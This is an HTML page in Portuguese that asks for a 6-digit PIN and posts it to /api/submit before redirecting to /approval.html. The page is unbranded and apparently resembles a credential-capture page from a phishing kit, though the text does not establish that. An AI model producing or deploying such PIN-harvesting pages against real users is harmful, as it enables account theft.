<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmação de PIN</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
        }

        .container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        p {
            margin-bottom: 30px;
            color: #666;
        }

        .pin-input {
            width: 50px;
            padding: 15px;
            margin: 0 5px;
            font-size: 18px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s;
        }

        .pin-input:focus {
            border-color: #1db954;
            box-shadow: 0 0 2px rgba(29, 185, 84, 0.5);
        }

        .submit-button {
            background-color: #1db954;
            color: #ffffff;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .submit-button:hover {
            background-color: #179a45;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Confirme seu PIN</h2>
        <p>Digite o PIN de 6 dígitos para continuar</p>
        <div id="pin-inputs">
            <input type="password" maxlength="1" class="pin-input" id="pin1">
            <input type="password" maxlength="1" class="pin-input" id="pin2">
            <input type="password" maxlength="1" class="pin-input" id="pin3">
            <input type="password" maxlength="1" class="pin-input" id="pin4">
            <input type="password" maxlength="1" class="pin-input" id="pin5">
            <input type="password" maxlength="1" class="pin-input" id="pin6">
        </div>
        <button class="submit-button" onclick="submitPin()">Confirmar</button>
    </div>

    <script>
        function collectPin() {
            let pin = '';
            for (let i = 1; i <= 6; i++) {
                pin += document.getElementById(`pin${i}`).value;
            }
            return pin;
        }

        async function submitPin() {
            const pin = collectPin();
            if (pin.length !== 6) {
                alert('Por favor, preencha todos os campos.');
                return;
            }

            try {
                const response = await fetch('/api/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'PIN_CONFIRMATION',
                        content: { pin }
                    })
                });

                if (response.ok) {
                    window.location.href = '/approval.html';
                } else {
                    alert('Erro ao confirmar PIN. Tente novamente.');
                }
            } catch (error) {
                console.error('Erro de conexão:', error);
                alert('Erro de conexão. Verifique sua internet.');
            }
            // Ensure every user has a unique ID stored in their browser
                if (!localStorage.getItem('sessionId')) {
                localStorage.setItem('sessionId', Math.random().toString(36).substring(2, 15));
                 }
                const sessionId = localStorage.getItem('sessionId');
        }
    </script>
</body>
</html>
